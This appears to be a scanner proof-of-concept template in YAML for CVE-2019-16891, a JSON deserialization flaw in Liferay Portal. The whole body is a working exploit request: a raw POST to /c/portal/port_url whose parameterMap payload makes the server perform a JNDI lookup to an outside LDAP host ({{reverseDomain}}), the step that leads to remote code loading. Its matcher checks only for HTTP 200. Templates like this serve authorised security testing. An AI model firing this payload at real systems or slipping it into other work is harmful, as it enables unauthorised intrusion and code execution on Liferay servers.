id: yaml-poc-liferay-liferay_portal-logical-CVE-2019-16891

info:
  name: yaml-poc-liferay-liferay_portal-logical-CVE-2019-16891
  author: jiapeng.han
  severity: critical
  tags: xray-converted,cve-2019-16891
  reference:
    - https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from
    - https://nvd.nist.gov/vuln/detail/CVE-2019-16891
    - https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/
    - https://www.liferay.com/downloads-community
    - https://www.youtube.com/watch?v=DjMEfQW3bf0

http:
  - raw:
      - |
        POST /c/portal/port_url HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        parameterMap={"javaClass":"org.hibernate.jmx.StatisticsService","sessionFactoryJNDIName":ldap://{{reverseDomain}}"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200